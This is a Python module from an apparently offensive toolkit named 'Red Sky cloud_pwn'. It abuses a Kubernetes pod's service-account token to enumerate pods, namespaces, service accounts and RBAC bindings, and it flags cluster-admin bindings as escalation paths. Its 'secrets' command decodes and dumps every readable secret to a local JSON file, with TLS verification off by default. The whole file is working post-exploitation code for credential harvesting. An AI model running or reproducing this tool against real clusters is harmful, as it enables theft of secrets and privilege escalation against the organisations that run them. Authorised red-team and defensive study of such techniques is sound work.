# language: Python, file: Program/cloud_pwn/k8s.py, target: Red Sky cloud_pwn — Kubernetes
# Abuses a service-account token found inside a running pod to enumerate the
# cluster, list secrets, and check for RBAC escalation paths.

import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CLOUD_DIR = OUTPUT_DIR / "cloud_pwn"

# standard in-pod locations
SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
SA_CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
SA_NS_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"


def _in_cluster_token() -> Optional[Dict]:
    """Read the pod's own service-account token if we're inside a cluster."""
    out = {}
    for key, path in (("token", SA_TOKEN_PATH), ("ca", SA_CA_PATH), ("namespace", SA_NS_PATH)):
        p = Path(path)
        if p.exists():
            try:
                out[key] = p.read_text().strip()
            except OSError:
                return None
    if "token" not in out:
        return None
    return out


def _api_get(host: str, path: str, token: str, verify: bool = False,
             timeout: int = 8) -> Optional[Dict]:
    url = f"{host.rstrip('/')}{path}"
    try:
        r = requests.get(url, headers={"Authorization": f"Bearer {token}"},
                         timeout=timeout, verify=verify)
    except requests.RequestException:
        return None
    if r.status_code == 200:
        try:
            return r.json()
        except json.JSONDecodeError:
            return {"raw": r.text[:2000]}
    return None


def cmd_whoami(host: str = "", token: str = "", verify: bool = False) -> int:
    if not host:
        host = "https://kubernetes.default.svc"
    if not token:
        creds = _in_cluster_token()
        if not creds:
            print_err("no token provided and not in a cluster (no SA token on disk)")
            return 1
        token = creds["token"]
        print_ok("using in-cluster service account token")

    print_info(f"querying Kubernetes API at {host}")
    print()

    # selfsubjectaccessreview is the cleanest way to see what we can do
    svc = _api_get(host, "/api/v1/namespaces", token, verify)
    if svc:
        print_ok("API reachable")
        namespaces = [n["metadata"]["name"] for n in svc.get("items", [])]
        print_kv("namespaces", len(namespaces))
        for n in namespaces[:30]:
            print(f"  {ARTERY}▓{RESET} {BONE}{n}{RESET}")
    else:
        print_warn("namespaces list denied — token may have narrow RBAC")

    return 0


def cmd_enum(host: str = "", token: str = "", verify: bool = False, out_file: str = "") -> int:
    CLOUD_DIR.mkdir(parents=True, exist_ok=True)
    if not host:
        host = "https://kubernetes.default.svc"
    if not token:
        creds = _in_cluster_token()
        if not creds:
            print_err("no token")
            return 1
        token = creds["token"]
        verify = False

    print_info(f"enumerating cluster {host}")
    print()

    result = {"host": host, "ts": int(time.time())}

    # pods
    pods = _api_get(host, "/api/v1/pods", token, verify)
    if pods:
        items = pods.get("items", [])
        result["pods"] = [
            {
                "name": p["metadata"]["name"],
                "namespace": p["metadata"]["namespace"],
                "node": p.get("spec", {}).get("nodeName", ""),
                "image": (p.get("spec", {}).get("containers") or [{}])[0].get("image", ""),
                "sa": p.get("spec", {}).get("serviceAccountName", ""),
            } for p in items
        ]
        print_ok(f"{len(result['pods'])} pod(s)")
        for p in result["pods"][:20]:
            print(f"  {ARTERY}▓{RESET} {BONE}{p['namespace']}/{p['name']:<40}{RESET} "
                  f"{ASH}sa={p['sa']}{RESET}")

    # secrets
    secrets = _api_get(host, "/api/v1/secrets", token, verify)
    if secrets:
        items = secrets.get("items", [])
        result["secrets"] = [
            {
                "name": s["metadata"]["name"],
                "namespace": s["metadata"]["namespace"],
                "type": s.get("type", ""),
                "has_data": bool(s.get("data")),
            } for s in items
        ]
        print()
        print_ok(f"{len(result['secrets'])} secret(s)")
        for s in result["secrets"][:20]:
            print(f"  {SCARLET}▓{RESET} {BONE}{s['namespace']}/{s['name']:<40}{RESET} "
                  f"{ASH}type={s['type']}{RESET}")

    # service accounts
    sas = _api_get(host, "/api/v1/serviceaccounts", token, verify)
    if sas:
        result["service_accounts"] = [
            {"name": s["metadata"]["name"], "namespace": s["metadata"]["namespace"]}
            for s in sas.get("items", [])
        ]
        print()
        print_ok(f"{len(result['service_accounts'])} service account(s)")

    # cluster roles + bindings (RBAC)
    cr = _api_get(host, "/apis/rbac.authorization.k8s.io/v1/clusterroles", token, verify)
    if cr:
        result["cluster_roles"] = [r["metadata"]["name"] for r in cr.get("items", [])]
        print_ok(f"{len(result['cluster_roles'])} cluster role(s)")

    crb = _api_get(host, "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", token, verify)
    if crb:
        result["cluster_role_bindings"] = [
            {
                "name": b["metadata"]["name"],
                "role": b.get("roleRef", {}).get("name", ""),
                "subjects": [s.get("name", "") for s in b.get("subjects", [])],
            } for b in crb.get("items", [])
        ]
        print_ok(f"{len(result['cluster_role_bindings'])} cluster role binding(s)")

    # RBAC escalation — common roles that grant cluster-admin
    escalations = []
    for b in result.get("cluster_role_bindings", []):
        if b["role"] == "cluster-admin":
            escalations.append(b)
    if escalations:
        print()
        print_warn(f"{len(escalations)} cluster-admin binding(s) found — check if any subject is reachable")

    out = Path(out_file) if out_file else CLOUD_DIR / f"k8s_{int(time.time())}.json"
    out.write_text(json.dumps(result, indent=2, default=str))
    print()
    print_kv("saved", out)
    return 0


def cmd_secrets(host: str = "", token: str = "", verify: bool = False, out_file: str = "") -> int:
    """Dump decoded secret data for every readable secret."""
    import base64
    CLOUD_DIR.mkdir(parents=True, exist_ok=True)
    if not host:
        host = "https://kubernetes.default.svc"
    if not token:
        creds = _in_cluster_token()
        if not creds:
            print_err("no token")
            return 1
        token = creds["token"]

    print_info("dumping readable secrets")
    result = []

    for ns_path in ("/api/v1/secrets", ):
        data = _api_get(host, ns_path, token, verify)
        if not data:
            continue
        for s in data.get("items", []):
            entry = {
                "name": s["metadata"]["name"],
                "namespace": s["metadata"]["namespace"],
                "type": s.get("type", ""),
                "data": {},
            }
            for k, v in (s.get("data") or {}).items():
                try:
                    entry["data"][k] = base64.b64decode(v).decode("utf-8", errors="replace")
                except Exception:
                    entry["data"][k] = v
            result.append(entry)
            print(f"  {SCARLET}▓{RESET} {BONE}{entry['namespace']}/{entry['name']}{RESET}")

    if not result:
        print_warn("no readable secrets")

    out = Path(out_file) if out_file else CLOUD_DIR / f"k8s_secrets_{int(time.time())}.json"
    out.write_text(json.dumps(result, indent=2, default=str))
    print()
    print_kv("saved", out)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky cloud_pwn k8s", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="whoami")
    p.add_argument("--host", default="")
    p.add_argument("--token", default="")
    p.add_argument("--verify", action="store_true")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky cloud_pwn k8s <whoami|enum|secrets> [--host URL] [--token TOKEN] [--out FILE]")
        return 2

    if ns.help:
        print_info("redsky cloud_pwn k8s whoami [--host https://kubernetes.default.svc] [--token T]")
        print_info("redsky cloud_pwn k8s enum   full namespace/pod/secret/RBAC walk")
        print_info("redsky cloud_pwn k8s secrets  decode and dump all readable secrets")
        print_info("  with no --token, reads the in-pod service-account token on disk")
        return 0

    if ns.action == "whoami":
        return cmd_whoami(ns.host, ns.token, ns.verify)
    if ns.action == "enum":
        return cmd_enum(ns.host, ns.token, ns.verify, ns.out)
    if ns.action == "secrets":
        return cmd_secrets(ns.host, ns.token, ns.verify, ns.out)
    print_err(f"unknown k8s action: {ns.action}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
